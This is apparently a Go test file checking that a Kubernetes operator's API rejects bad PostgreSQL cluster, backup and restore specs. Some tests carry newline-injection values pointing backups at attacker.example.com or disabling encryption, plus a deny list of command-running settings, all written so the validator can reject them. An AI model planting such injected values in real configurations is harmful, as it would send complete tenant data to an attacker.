package v1alpha1_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/andrew01234567890/pgshard/internal/dockertest"

	corev1 "k8s.io/api/core/v1"
	networkingv1 "k8s.io/api/networking/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime"
	clientgoscheme "k8s.io/client-go/kubernetes/scheme"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/envtest"

	pgshardv1alpha1 "github.com/andrew01234567890/pgshard/api/v1alpha1"
)

var k8sClient client.Client

func TestMain(m *testing.M) {
	// Without a control plane the CRD validation tests skip themselves, but
	// the rest of this package's tests read the generated manifests and need
	// nothing: exiting here would take them with it.
	if !dockertest.EnvtestAvailable() {
		fmt.Fprint(os.Stderr, "envtest: KUBEBUILDER_ASSETS is not set; run 'make envtest'. Skipping the API CRD validation tests.\n")
		os.Exit(m.Run())
	}
	env := &envtest.Environment{
		CRDDirectoryPaths:     []string{filepath.Join("..", "..", "config", "crd", "bases")},
		ErrorIfCRDPathMissing: true,
	}
	cfg, err := env.Start()
	if err != nil {
		fmt.Fprint(os.Stderr, "envtest: start: "+err.Error()+"\n")
		os.Exit(1)
	}
	scheme := runtime.NewScheme()
	if err := clientgoscheme.AddToScheme(scheme); err != nil {
		panic(err)
	}
	if err := pgshardv1alpha1.AddToScheme(scheme); err != nil {
		panic(err)
	}
	k8sClient, err = client.New(cfg, client.Options{Scheme: scheme})
	if err != nil {
		panic(err)
	}
	code := m.Run()
	_ = env.Stop()
	os.Exit(code)
}

func validCluster(name string) *pgshardv1alpha1.PgShardCluster {
	return &pgshardv1alpha1.PgShardCluster{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
		Spec: pgshardv1alpha1.PgShardClusterSpec{
			PostgreSQL:  pgshardv1alpha1.PostgreSQLSpec{Major: 18},
			Catalog:     pgshardv1alpha1.CatalogSpec{Storage: pgshardv1alpha1.StorageSpec{Size: resource.MustParse("1Gi")}},
			Storage:     pgshardv1alpha1.StorageSpec{Size: resource.MustParse("10Gi")},
			InternalTLS: pgshardv1alpha1.InternalTLSSpec{Insecure: true},
		},
	}
}

func create(t *testing.T, obj client.Object) error {
	t.Helper()
	if k8sClient == nil {
		dockertest.EnvtestMissing(t, "the API CRD validation tests")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	err := k8sClient.Create(ctx, obj)
	if err == nil {
		t.Cleanup(func() { _ = k8sClient.Delete(context.Background(), obj) })
	}
	return err
}

func mustReject(t *testing.T, obj client.Object, want string) {
	t.Helper()
	err := create(t, obj)
	if err == nil {
		t.Fatalf("expected rejection containing %q, object was accepted", want)
	}
	if !apierrors.IsInvalid(err) || !strings.Contains(err.Error(), want) {
		t.Fatalf("expected Invalid error containing %q, got: %v", want, err)
	}
}

func TestClusterDefaultsApplied(t *testing.T) {
	c := validCluster("defaults")
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
	s := c.Spec
	if s.PostgreSQL.Profile != "oltp" {
		t.Errorf("profile = %q, want oltp", s.PostgreSQL.Profile)
	}
	if s.ReplicasPerShard != 3 {
		t.Errorf("replicasPerShard = %d, want 3", s.ReplicasPerShard)
	}
	if s.Catalog.Replicas != 3 {
		t.Errorf("catalog.replicas = %d, want 3", s.Catalog.Replicas)
	}
	if s.Resharding.RetireOldGroupsAfter == nil || s.Resharding.RetireOldGroupsAfter.Duration != 24*time.Hour {
		t.Errorf("retireOldGroupsAfter = %v, want 24h", s.Resharding.RetireOldGroupsAfter)
	}
	if s.Resharding.PauseBefore != "none" {
		t.Errorf("pauseBefore = %q, want none", s.Resharding.PauseBefore)
	}
	if s.Durability.SynchronousCommit != "on" || s.Durability.MinSyncStandbys != 1 {
		t.Errorf("durability = %+v", s.Durability)
	}
	if s.Router.MinReplicas != 2 || s.Router.MaxReplicas != 10 || s.Router.HPA.CPUUtilization != 70 {
		t.Errorf("router = %+v", s.Router)
	}
	if s.Admin.Enabled == nil || !*s.Admin.Enabled {
		t.Errorf("admin.enabled = %v, want true", s.Admin.Enabled)
	}
	if s.Upgrade.Strategy != "online" || s.Upgrade.MaxParallelGroups != 1 {
		t.Errorf("upgrade = %+v", s.Upgrade)
	}
	if s.Shards != nil {
		t.Errorf("shards defaulted to %d, want unset", *s.Shards)
	}
}

func TestClusterStatusSubresourceIgnoredOnCreate(t *testing.T) {
	c := validCluster("status")
	c.Status.ShardMapGeneration = 7
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
	if c.Status.ShardMapGeneration != 0 {
		t.Fatalf("status persisted on create: %+v", c.Status)
	}
	c.Status.ShardMapGeneration = 7
	c.Status.Conditions = []metav1.Condition{{Type: pgshardv1alpha1.ConditionReady, Status: metav1.ConditionTrue, Reason: "Test", LastTransitionTime: metav1.Now()}}
	if err := k8sClient.Status().Update(context.Background(), c); err != nil {
		t.Fatal(err)
	}
	if c.Status.ShardMapGeneration != 7 || len(c.Status.Conditions) != 1 {
		t.Fatalf("status update lost: %+v", c.Status)
	}
}

func TestClusterReplicasPerShardBelowThreeRejected(t *testing.T) {
	c := validCluster("rps")
	c.Spec.ReplicasPerShard = 2
	mustReject(t, c, "replicasPerShard must be >= 3")
}

func TestClusterCatalogReplicasBelowThreeRejected(t *testing.T) {
	c := validCluster("cat")
	c.Spec.Catalog.Replicas = 1
	mustReject(t, c, "catalog.replicas must be >= 3 for HA")
}

func TestClusterSingleReplicaAcceptedWithUnsafeGate(t *testing.T) {
	c := validCluster("unsafe-single")
	c.Spec.ReplicasPerShard = 1
	c.Spec.Catalog.Replicas = 1
	c.Spec.UnsafeSingleReplica = true
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
}

func TestClusterUnsafeGateFalseStillRejected(t *testing.T) {
	c := validCluster("unsafe-off")
	c.Spec.ReplicasPerShard = 1
	c.Spec.UnsafeSingleReplica = false
	mustReject(t, c, "replicasPerShard must be >= 3")
}

func TestClusterRouterMaxBelowMinRejected(t *testing.T) {
	c := validCluster("router")
	c.Spec.Router = pgshardv1alpha1.RouterSpec{MinReplicas: 5, MaxReplicas: 4}
	mustReject(t, c, "router.maxReplicas must be >= router.minReplicas")
}

func TestClusterRouterMaxEqualMinAccepted(t *testing.T) {
	c := validCluster("router-eq")
	c.Spec.Router = pgshardv1alpha1.RouterSpec{MinReplicas: 4, MaxReplicas: 4}
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
}

// TestClusterParameterKeyMustBeASettingName: the agent writes a
// parameter's name as it stands, so a name carrying a newline writes a
// second setting of its own -- and every rule beside this one names a
// setting, so anything they refuse could be smuggled in behind a key they
// allow.
func TestClusterParameterKeyMustBeASettingName(t *testing.T) {
	for name, key := range map[string]string{
		"newline": "work_mem = '4MB'\nssl",
		"space":   "work mem",
		"equals":  "work_mem=1",
		"quote":   "work_mem'",
		"empty":   "",
		"digit":   "1work_mem",
	} {
		t.Run(name, func(t *testing.T) {
			c := validCluster("paramkey-" + name)
			c.Spec.PostgreSQL.Parameters = map[string]string{key: "1"}
			mustReject(t, c, "every parameter key must be a PostgreSQL setting name")
		})
	}
}

func TestClusterUnsafeParametersRejected(t *testing.T) {
	for _, key := range []string{
		"fsync", "full_page_writes", "wal_level", "max_prepared_transactions", "ssl", "synchronous_commit",
		// Each of these makes PostgreSQL run a command in the member pod.
		"archive_command", "restore_command", "archive_cleanup_command", "recovery_end_command",
	} {
		t.Run(key, func(t *testing.T) {
			c := validCluster("param-" + strings.ReplaceAll(key, "_", "-"))
			c.Spec.PostgreSQL.Parameters = map[string]string{key: "off"}
			mustReject(t, c, "parameters must not set "+key)
		})
	}
}

func TestClusterSafeParametersAccepted(t *testing.T) {
	c := validCluster("param-ok")
	c.Spec.PostgreSQL.Parameters = map[string]string{"work_mem": "64MB", "log_min_duration_statement": "500"}
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
}

func TestClusterEnumsRejected(t *testing.T) {
	cases := []struct {
		name string
		mut  func(*pgshardv1alpha1.PgShardCluster)
	}{
		{"major", func(c *pgshardv1alpha1.PgShardCluster) { c.Spec.PostgreSQL.Major = 17 }},
		{"profile", func(c *pgshardv1alpha1.PgShardCluster) { c.Spec.PostgreSQL.Profile = "olap" }},
		{"upgrade-strategy", func(c *pgshardv1alpha1.PgShardCluster) { c.Spec.Upgrade.Strategy = "rolling" }},
		{"pause-before", func(c *pgshardv1alpha1.PgShardCluster) { c.Spec.Resharding.PauseBefore = "later" }},
		{"sync-commit", func(c *pgshardv1alpha1.PgShardCluster) { c.Spec.Durability.SynchronousCommit = "off" }},
		{"shards-zero", func(c *pgshardv1alpha1.PgShardCluster) { z := 0; c.Spec.Shards = &z }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := validCluster("enum-" + tc.name)
			tc.mut(c)
			if err := create(t, c); err == nil || !apierrors.IsInvalid(err) {
				t.Fatalf("expected Invalid error, got %v", err)
			}
		})
	}
}

func TestClusterMissingRequiredRejected(t *testing.T) {
	u := &unstructured.Unstructured{Object: map[string]any{
		"apiVersion": "pgshard.io/v1alpha1",
		"kind":       "PgShardCluster",
		"metadata":   map[string]any{"name": "noreq", "namespace": "default"},
		"spec": map[string]any{
			"postgresql": map[string]any{"major": 18},
			"catalog":    map[string]any{"storage": map[string]any{"size": "1Gi"}},
			"storage":    map[string]any{},
		},
	}}
	mustReject(t, u, "spec.storage.size")
}

func TestClusterFullSpecAccepted(t *testing.T) {
	c := validCluster("full")
	sc := "fast"
	shards := 4
	c.Spec.Shards = &shards
	// 19 is a beta, so it has to be asked for by name.
	c.Spec.PostgreSQL.Major = 19
	c.Spec.PostgreSQL.Image = "ghcr.io/andrew01234567890/pgshard-postgres:19beta3"
	c.Spec.PostgreSQL.Profile = "analytics"
	c.Spec.Storage.StorageClassName = &sc
	c.Spec.Resources = corev1.ResourceRequirements{Requests: corev1.ResourceList{corev1.ResourceCPU: resource.MustParse("2"), corev1.ResourceMemory: resource.MustParse("8Gi")}}
	c.Spec.Router.TLS.SecretRef = &corev1.LocalObjectReference{Name: "router-tls"}
	c.Spec.Backup.PolicyRef = "nightly"
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
	if c.Spec.Shards == nil || *c.Spec.Shards != 4 {
		t.Fatalf("shards = %v", c.Spec.Shards)
	}
}

func TestGroupKindEnum(t *testing.T) {
	g := &pgshardv1alpha1.PgShardGroup{
		ObjectMeta: metav1.ObjectMeta{Name: "g1", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardGroupSpec{ClusterRef: "c", Kind: "bogus"},
	}
	if err := create(t, g); err == nil || !apierrors.IsInvalid(err) {
		t.Fatalf("expected Invalid, got %v", err)
	}
	g.Spec.Kind = "shard"
	if err := create(t, g); err != nil {
		t.Fatal(err)
	}
}

func TestBackupPolicyStoreTypeEnum(t *testing.T) {
	p := &pgshardv1alpha1.PgShardBackupPolicy{
		ObjectMeta: metav1.ObjectMeta{Name: "p1", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardBackupPolicySpec{ObjectStore: pgshardv1alpha1.ObjectStoreSpec{Type: "ftp"}},
	}
	if err := create(t, p); err == nil || !apierrors.IsInvalid(err) {
		t.Fatalf("expected Invalid, got %v", err)
	}
	p.Spec.ObjectStore = pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "r",
		Credentials: pgshardv1alpha1.SecretRefSpec{SecretRef: &corev1.LocalObjectReference{Name: "creds"}},
		Encryption:  pgshardv1alpha1.SecretRefSpec{SecretRef: &corev1.LocalObjectReference{Name: "repo-key"}}}
	p.Spec.Schedules.Full = "0 2 * * 0"
	p.Spec.Retention.Full = 4
	if err := create(t, p); err != nil {
		t.Fatal(err)
	}
}

func TestBackupTypeDefaultsToFull(t *testing.T) {
	b := &pgshardv1alpha1.PgShardBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "b1", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardBackupSpec{ClusterName: "c"},
	}
	if err := create(t, b); err != nil {
		t.Fatal(err)
	}
	if b.Spec.Type != "full" {
		t.Fatalf("type = %q", b.Spec.Type)
	}
}

func TestRestoreTargetMutuallyExclusive(t *testing.T) {
	lsn := "0/1000000"
	r := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "r1", Namespace: "default"},
		Spec: pgshardv1alpha1.PgShardRestoreSpec{ClusterName: "c", NewClusterName: "c2", BackupID: "x", Target: pgshardv1alpha1.RestoreTarget{
			LSN: &lsn, Time: &metav1.Time{Time: time.Now()},
		}},
	}
	mustReject(t, r, "at most one of target.time")
	r.Spec.Target = pgshardv1alpha1.RestoreTarget{LSN: &lsn}
	if err := create(t, r); err != nil {
		t.Fatal(err)
	}
	imm := false
	r2 := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "r2", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardRestoreSpec{ClusterName: "c", NewClusterName: "c2", Target: pgshardv1alpha1.RestoreTarget{LSN: &lsn, Immediate: &imm}},
	}
	if err := create(t, r2); err != nil {
		t.Fatalf("immediate=false should not count as a target: %v", err)
	}
}

func TestRestoreSpecRules(t *testing.T) {
	name := "rp"
	xid := "42"
	imm := true
	r := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "r3", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardRestoreSpec{ClusterName: "c", NewClusterName: "c", Target: pgshardv1alpha1.RestoreTarget{Name: &name}, BackupID: "x"},
	}
	mustReject(t, r, "newClusterName must differ")
	r.Spec.NewClusterName = "c2"
	r.Spec.BackupID = ""
	mustReject(t, r, "require backupId")
	r.Spec.Target = pgshardv1alpha1.RestoreTarget{XID: &xid}
	mustReject(t, r, "require backupId")
	r.Spec.Target = pgshardv1alpha1.RestoreTarget{Immediate: &imm}
	mustReject(t, r, "require backupId")
	barrier := "nightly-1"
	r.Spec.Target = pgshardv1alpha1.RestoreTarget{Barrier: &barrier}
	mustReject(t, r, "require backupId")
	r.Spec.Target = pgshardv1alpha1.RestoreTarget{Barrier: &barrier, Name: &name}
	r.Spec.BackupID = "x"
	mustReject(t, r, "at most one of target.time")
	r.Spec.BackupID = ""
	r.Spec.Target = pgshardv1alpha1.RestoreTarget{Time: &metav1.Time{Time: time.Now()}}
	if err := create(t, r); err != nil {
		t.Fatalf("time target without backupId: %v", err)
	}
	r4 := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "r4", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardRestoreSpec{ClusterName: "c", NewClusterName: "c3", Target: pgshardv1alpha1.RestoreTarget{Name: &name}, BackupID: "b1"},
	}
	if err := create(t, r4); err != nil {
		t.Fatalf("name target with backupId: %v", err)
	}
	r6 := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "r6", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardRestoreSpec{ClusterName: "c", NewClusterName: "c4", Target: pgshardv1alpha1.RestoreTarget{Barrier: &barrier}, BackupID: "b1"},
	}
	if err := create(t, r6); err != nil {
		t.Fatalf("barrier target with backupId: %v", err)
	}
	r5 := &pgshardv1alpha1.PgShardRestore{
		ObjectMeta: metav1.ObjectMeta{Name: "r5", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardRestoreSpec{ClusterName: "c"},
	}
	if err := create(t, r5); err == nil || !apierrors.IsInvalid(err) {
		t.Fatalf("missing newClusterName: %v", err)
	}
}

func TestReshardSpecValidation(t *testing.T) {
	valid := func(name string) *pgshardv1alpha1.PgShardReshard {
		return &pgshardv1alpha1.PgShardReshard{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
			Spec: pgshardv1alpha1.PgShardReshardSpec{
				ClusterName: "c", FromGeneration: 1, TargetGeneration: 2, TargetShardSet: "g2", TargetShards: 2,
				TargetRanges: []pgshardv1alpha1.ReshardRange{{ShardID: 0, RangeStart: -9223372036854775808, RangeEnd: -1}, {ShardID: 1, RangeStart: 0, RangeEnd: 9223372036854775807}},
			},
		}
	}
	cases := map[string]func(*pgshardv1alpha1.PgShardReshard){
		"zero_target_shards":          func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.TargetShards = 0 },
		"ranges_count_mismatch":       func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.TargetShards = 3 },
		"target_not_after_from":       func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.FromGeneration = 2 },
		"empty_target_set":            func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.TargetShardSet = "" },
		"negative_shard_id":           func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.TargetRanges[0].ShardID = -1 },
		"no_ranges":                   func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.TargetRanges = nil; r.Spec.TargetShards = 0 },
		"target_generation_below_two": func(r *pgshardv1alpha1.PgShardReshard) { r.Spec.TargetGeneration = 1; r.Spec.FromGeneration = 1 },
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			r := valid("rs-" + name)
			mutate(r)
			if err := create(t, r); err == nil || !apierrors.IsInvalid(err) {
				t.Fatalf("expected Invalid, got %v", err)
			}
		})
	}
	r := valid("rs-ok")
	if err := create(t, r); err != nil {
		t.Fatal(err)
	}
	r.Status.Phase = "Copying"
	r.Status.JournalIDs = []string{"j1"}
	r.Status.Targets = []pgshardv1alpha1.ReshardTargetStatus{{ShardID: 0, Group: "shard-0-g2", Ready: true}}
	if err := k8sClient.Status().Update(context.Background(), r); err != nil {
		t.Fatal(err)
	}
	r.Status.Phase = "Bogus"
	if err := k8sClient.Status().Update(context.Background(), r); err == nil || !apierrors.IsInvalid(err) {
		t.Fatalf("expected Invalid phase, got %v", err)
	}
}

func TestClusterShardsAndReshardingValidation(t *testing.T) {
	c := validCluster("shards-zero")
	zero := 0
	c.Spec.Shards = &zero
	if err := create(t, c); err == nil || !apierrors.IsInvalid(err) {
		t.Fatalf("expected Invalid, got %v", err)
	}
	c = validCluster("pause-bogus")
	c.Spec.Resharding.PauseBefore = "later"
	if err := create(t, c); err == nil || !apierrors.IsInvalid(err) {
		t.Fatalf("expected Invalid, got %v", err)
	}
	c = validCluster("reshard-defaults")
	two := 2
	c.Spec.Shards = &two
	if err := create(t, c); err != nil {
		t.Fatal(err)
	}
	if c.Spec.Resharding.PauseBefore != "none" || c.Spec.Resharding.RetireOldGroupsAfter == nil || c.Spec.Resharding.RetireOldGroupsAfter.Duration != 24*time.Hour {
		t.Fatalf("resharding defaults %+v", c.Spec.Resharding)
	}
	c.Status.EffectiveShards = 2
	c.Status.Reshard = &pgshardv1alpha1.ClusterReshardStatus{Name: "x", ShardSet: "g2", Generation: 2, Shards: 4, Phase: "Provisioning"}
	if err := k8sClient.Status().Update(context.Background(), c); err != nil {
		t.Fatal(err)
	}
}

// TestBackupSpecIsImmutable: a backup is one operation, and the physical
// work starts against the cluster and type it was created with. Editing
// clusterName from A to B while the run was going recorded the result of
// backing up A as a backup of B -- counted toward B's health, and offered
// to a restore of B with A's stanzas behind it.
func TestBackupSpecIsImmutable(t *testing.T) {
	b := &pgshardv1alpha1.PgShardBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "immutable", Namespace: "default"},
		Spec:       pgshardv1alpha1.PgShardBackupSpec{ClusterName: "a", Type: "full"},
	}
	if err := create(t, b); err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		what string
		edit func(*pgshardv1alpha1.PgShardBackup)
	}{
		{"cluster", func(x *pgshardv1alpha1.PgShardBackup) { x.Spec.ClusterName = "b" }},
		{"type", func(x *pgshardv1alpha1.PgShardBackup) { x.Spec.Type = "incremental" }},
	} {
		t.Run(c.what, func(t *testing.T) {
			var got pgshardv1alpha1.PgShardBackup
			if err := k8sClient.Get(context.Background(), client.ObjectKeyFromObject(b), &got); err != nil {
				t.Fatal(err)
			}
			c.edit(&got)
			err := k8sClient.Update(context.Background(), &got)
			if err == nil || !strings.Contains(err.Error(), "spec is immutable") {
				t.Fatalf("editing %s after create: %v", c.what, err)
			}
		})
	}
	// An update that changes nothing is still allowed, so a controller may
	// set labels or finalizers on a running backup.
	var got pgshardv1alpha1.PgShardBackup
	if err := k8sClient.Get(context.Background(), client.ObjectKeyFromObject(b), &got); err != nil {
		t.Fatal(err)
	}
	got.Labels = map[string]string{"pgshard.io/keep": "yes"}
	if err := k8sClient.Update(context.Background(), &got); err != nil {
		t.Fatalf("a metadata-only update must be allowed: %v", err)
	}
}

// TestObjectStoreRequiresWhatItsVariantNeeds: a policy missing the fields
// its store type needs was accepted by the API and only then marked
// Valid=False by the reconciler, which is a rejected desired state sitting
// in the cluster for something to read.
func TestObjectStoreRequiresWhatItsVariantNeeds(t *testing.T) {
	policy := func(name string, st pgshardv1alpha1.ObjectStoreSpec) *pgshardv1alpha1.PgShardBackupPolicy {
		return &pgshardv1alpha1.PgShardBackupPolicy{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
			Spec:       pgshardv1alpha1.PgShardBackupPolicySpec{ObjectStore: st},
		}
	}
	secret := pgshardv1alpha1.SecretRefSpec{SecretRef: &corev1.LocalObjectReference{Name: "creds"}}
	for _, c := range []struct {
		name  string
		store pgshardv1alpha1.ObjectStoreSpec
		want  string
	}{
		{"s3 without bucket", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Endpoint: "s3.example", Region: "eu", Credentials: secret, Encryption: secret}, "needs bucket, endpoint and region"},
		{"s3 without endpoint", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Region: "eu", Credentials: secret, Encryption: secret}, "needs bucket, endpoint and region"},
		{"s3 without region", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Credentials: secret, Encryption: secret}, "needs bucket, endpoint and region"},
		{"s3 shared without credentials", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "eu"}, "shared credentials need credentials.secretRef"},
		{"azure without container", pgshardv1alpha1.ObjectStoreSpec{Type: "azure", Credentials: secret, Encryption: secret}, "needs container"},
		{"azure without credentials", pgshardv1alpha1.ObjectStoreSpec{Type: "azure", Container: "c"}, "azure store needs credentials.secretRef"},
		{"gcs without bucket", pgshardv1alpha1.ObjectStoreSpec{Type: "gcs", Credentials: secret, Encryption: secret}, "gcs store needs bucket"},
		{"gcs service without credentials", pgshardv1alpha1.ObjectStoreSpec{Type: "gcs", Bucket: "b"}, "service and token credentials need"},
		{"sftp without host settings", pgshardv1alpha1.ObjectStoreSpec{Type: "sftp", Credentials: secret, Encryption: secret}, "needs sftp.host and sftp.user"},
		{"sftp without credentials", pgshardv1alpha1.ObjectStoreSpec{Type: "sftp", SFTP: &pgshardv1alpha1.SFTPStoreSpec{Host: "h", User: "u"}}, "sftp store needs credentials.secretRef"},
		{"s3 with azure's credential type", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "eu", CredentialType: "sas", Credentials: secret, Encryption: secret}, "credentialType must suit the store"},
		{"azure with s3's credential type", pgshardv1alpha1.ObjectStoreSpec{Type: "azure", Container: "c", CredentialType: "web-id", Credentials: secret, Encryption: secret}, "credentialType must suit the store"},
		{"gcs with azure's credential type", pgshardv1alpha1.ObjectStoreSpec{Type: "gcs", Bucket: "b", CredentialType: "shared", Credentials: secret, Encryption: secret}, "credentialType must suit the store"},
		{"posix with a credential type it cannot use", pgshardv1alpha1.ObjectStoreSpec{Type: "posix", CredentialType: "auto"}, "credentialType must suit the store"},
	} {
		t.Run(c.name, func(t *testing.T) {
			mustReject(t, policy(strings.ToLower(strings.ReplaceAll(c.name, " ", "-")), c.store), c.want)
		})
	}

	// The complete forms, and posix which needs nothing.
	for _, c := range []struct {
		name  string
		store pgshardv1alpha1.ObjectStoreSpec
	}{
		{"s3", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "eu", Credentials: secret, Encryption: secret}},
		{"s3 web-id", pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "eu", CredentialType: "web-id", Encryption: secret}},
		{"azure", pgshardv1alpha1.ObjectStoreSpec{Type: "azure", Container: "c", Credentials: secret, Encryption: secret}},
		{"gcs auto", pgshardv1alpha1.ObjectStoreSpec{Type: "gcs", Bucket: "b", CredentialType: "auto", Encryption: secret}},
		{"sftp", pgshardv1alpha1.ObjectStoreSpec{Type: "sftp", SFTP: &pgshardv1alpha1.SFTPStoreSpec{Host: "h", User: "u"}, Credentials: secret, Encryption: secret}},
		{"posix", pgshardv1alpha1.ObjectStoreSpec{Type: "posix"}},
	} {
		t.Run("accepts "+c.name, func(t *testing.T) {
			if err := create(t, policy("ok-"+strings.ReplaceAll(c.name, " ", "-"), c.store)); err != nil {
				t.Fatalf("a complete %s store must be accepted: %v", c.name, err)
			}
		})
	}
}

// TestABackupScheduleIsJudgedWhenItIsWritten: a schedule that can never
// fire used to be accepted and reported as a condition afterwards, by
// which time clusters may already be bound to the policy.
func TestABackupScheduleIsJudgedWhenItIsWritten(t *testing.T) {
	store := pgshardv1alpha1.ObjectStoreSpec{Type: "posix"}
	policy := func(name string, mutate func(*pgshardv1alpha1.PgShardBackupPolicySpec)) *pgshardv1alpha1.PgShardBackupPolicy {
		spec := pgshardv1alpha1.PgShardBackupPolicySpec{ObjectStore: store}
		mutate(&spec)
		return &pgshardv1alpha1.PgShardBackupPolicy{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
			Spec:       spec,
		}
	}
	for _, c := range []struct {
		name   string
		mutate func(*pgshardv1alpha1.PgShardBackupPolicySpec)
	}{
		{"full-is-prose", func(s *pgshardv1alpha1.PgShardBackupPolicySpec) { s.Schedules.Full = "every night" }},
		{"differential-is-short", func(s *pgshardv1alpha1.PgShardBackupPolicySpec) { s.Schedules.Differential = "0 2 * *" }},
		{"incremental-is-long", func(s *pgshardv1alpha1.PgShardBackupPolicySpec) { s.Schedules.Incremental = "0 2 * * * *" }},
		{"descriptor-is-invented", func(s *pgshardv1alpha1.PgShardBackupPolicySpec) { s.BarrierSchedule = "@fortnightly" }},
	} {
		t.Run(c.name, func(t *testing.T) {
			mustReject(t, policy(c.name, c.mutate), "spec")
		})
	}
	accepted := policy("schedules-ok", func(s *pgshardv1alpha1.PgShardBackupPolicySpec) {
		s.Schedules = pgshardv1alpha1.BackupSchedules{Full: "0 2 * * 0", Differential: "@daily", Incremental: "*/15 1-5 * JAN-MAR MON,TUE"}
		s.BarrierSchedule = "@every 1h30m"
	})
	if err := create(t, accepted); err != nil {
		t.Fatalf("valid schedules must be accepted: %v", err)
	}
	// The defaults the runtime applies are written down, so the stored
	// object says what it will do rather than leaving it to be filled in.
	if accepted.Spec.LogLevel != "info" || accepted.Spec.ProcessMax != 2 {
		t.Fatalf("defaults not persisted: logLevel %q processMax %d", accepted.Spec.LogLevel, accepted.Spec.ProcessMax)
	}
}

// TestBackupPolicyStoreFieldCannotInjectAnOption: these fields are written
// into pgbackrest.conf as key=value lines, so a value carrying a newline
// writes an option of its own -- an endpoint of the attacker's choosing
// takes every backup and WAL segment with it, and the backups are the one
// artifact holding a complete copy of all tenant data.
func TestBackupPolicyStoreFieldCannotInjectAnOption(t *testing.T) {
	hostile := "x\nrepo1-s3-endpoint=attacker.example.com"
	policy := func(name string, mutate func(*pgshardv1alpha1.ObjectStoreSpec)) *pgshardv1alpha1.PgShardBackupPolicy {
		store := pgshardv1alpha1.ObjectStoreSpec{Type: "s3", Bucket: "b", Endpoint: "s3.example", Region: "r",
			Credentials: pgshardv1alpha1.SecretRefSpec{SecretRef: &corev1.LocalObjectReference{Name: "creds"}}}
		mutate(&store)
		p := &pgshardv1alpha1.PgShardBackupPolicy{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
			Spec:       pgshardv1alpha1.PgShardBackupPolicySpec{ObjectStore: store},
		}
		p.Spec.Schedules.Full = "0 2 * * 0"
		p.Spec.Retention.Full = 4
		return p
	}
	for name, tc := range map[string]struct {
		mutate func(*pgshardv1alpha1.ObjectStoreSpec)
		field  string
	}{
		"bucket":    {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Bucket = hostile }, "bucket"},
		"endpoint":  {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Endpoint = hostile }, "endpoint"},
		"region":    {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Region = hostile }, "region"},
		"prefix":    {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Prefix = "/x\nrepo1-cipher-type=none" }, "prefix"},
		"carriage":  {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Endpoint = "x\rrepo1-s3-endpoint=e" }, "endpoint"},
		"equals":    {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Region = "a=b" }, "region"},
		"container": {func(s *pgshardv1alpha1.ObjectStoreSpec) { s.Container = hostile }, "container"},
	} {
		t.Run(name, func(t *testing.T) {
			mustReject(t, policy("inject-"+name, tc.mutate), tc.field+" must not contain a newline")
		})
	}
}

func TestClusterNetworkPolicyWithoutClientsRejected(t *testing.T) {
	c := validCluster("netpol-empty")
	c.Spec.NetworkPolicy.Enabled = true
	mustReject(t, c, "networkPolicy.clients must name the control plane")
}

